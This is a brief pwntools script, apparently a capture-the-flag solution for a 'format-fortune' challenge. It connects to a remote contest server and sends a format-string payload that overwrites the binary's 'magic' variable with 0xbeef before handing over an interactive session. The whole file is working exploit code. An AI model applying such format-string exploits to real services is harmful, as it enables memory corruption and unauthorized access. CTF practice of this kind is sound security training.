from pwn import *

local = False
fname = 'format-fortune'
host,port = 'bin.bcactf.com', 49175
r = process(fname) if local else remote(host,port)

p = ELF(fname)

def header():
	r.recvuntil(b'?')

def send_payload():
	mal_payload = fmtstr_payload(6,{p.sym['magic']:0xbeef})
	r.sendline(mal_payload)	

if __name__=='__main__':
	context.clear(arch = 'amd64')
	header()
	send_payload()
	r.interactive()








